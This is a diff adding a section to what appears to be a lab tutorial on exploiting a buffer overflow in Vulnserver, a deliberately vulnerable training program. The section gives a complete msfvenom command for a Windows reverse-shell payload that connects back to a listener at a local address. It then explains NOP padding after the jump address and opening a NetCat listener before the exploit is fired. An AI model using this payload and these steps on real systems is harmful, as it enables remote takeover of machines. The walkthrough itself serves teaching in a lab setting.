@@ -165,4 +165,30 @@ our script to get root.
 
 ### Generating Shellcode and Getting Root
 
+The tool used to generate shellcode will be the ever trusty `msfvenom`. To
+generate this we will run this command:
 
+```
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.27 LPORT=4444
+
+EXITFUNC=thread -f c -a x86 -b "\x00"
+
+```
+
+- `EXITFUNC` should make the exploit more stable.
+
+- -f is the output format of the c
+
+- -a designates the machine architecture
+
+- -b tells the payload generator what bad characters to avoid.
+
+We can then add this bytecode as a variable to our script and add it to
+the shellcode variable after our JMP address. Additionally, we need to
+provide "nops" or no operations, as padding between the EIP and the
+overflow script. Here we will use `"\x90" * 32`. 
+
+After finishing this script, we can open a NetCat listening port on the
+port that we specified in payload script, make sure Vulnserver is running
+and then fire the exploit.
